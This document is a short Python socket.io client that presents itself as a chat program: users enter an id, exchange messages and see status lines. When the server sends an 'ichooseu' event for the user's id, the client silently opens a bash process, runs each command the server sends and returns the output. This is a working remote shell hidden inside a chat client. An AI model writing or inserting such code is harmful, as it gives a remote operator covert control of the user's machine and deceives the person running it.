import socketio 
import subprocess , time
import select

sio = socketio.Client() 

process = None
choosen = False

@sio.event()
def ichooseu(userid):
    global choosen 
    choosen = True
    global process
    if userid == myuserid:
        process = subprocess.Popen(
            ["bash"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=1,
            universal_newlines=True
        )
        time.sleep(0.1)

        process.stdin.write("pwd\n")
        process.stdin.flush()
        output_line = process.stdout.readline()
        time.sleep(0.1)
        sio.emit("message", {"userid": userid, "message": output_line , "type": "rcommand"})

@sio.event()
def connect():
    print("Connected to the server")
    print("------------------------")

@sio.event()
def disconnect():
    print("Disconnected")
    print("------------------------")

@sio.event()
def message(message):
    global process
    if (message['userid']!=myuserid and message["type"]=="message"):
        print(f"{message['userid']}: {message['message']}")
        print("------------------------")
    elif (message['userid']!=myuserid and message["type"]=="status"):
        print(f"{message['userid']} {message['message']}")
        print("------------------------")
    elif (message['userid']==myuserid and message["type"]=="command"):
        process.stdin.write(message['message'] + "\n")
        process.stdin.flush()
        time.sleep(0.1)
        process.stdin.write("pwd\n")
        process.stdin.flush()
        output_lines =[]
        while True:
            ready , _,_ = select.select([process.stdout],[],[],0.5)
            if ready:
               output = process.stdout.readline()
               if output:
                  output_lines.append(output.strip())
            else:
                break
        
        sio.emit("message", {"userid": myuserid, "message": "\n".join(output_lines) , "type": "rcommand"})


if __name__ == "__main__":
    myuserid = input("enter your userid: ")
    server_address = "http://192.168.1.10:8080"
    sio.connect(server_address)
    sio.emit("connection",myuserid)
    while True:
        message = input()
        print("------------------------")
        json = {"userid":myuserid,"message":message,"type":"message"}
        if message == "exit":
            sio.emit("message",{"userid":myuserid,"message":"left the chat","type":"status"})
            break
        sio.emit("message", json)
    if choosen:
      if process and process.poll() is None:
        process.terminate()
        process.wait()
    sio.disconnect()
    exit(0)
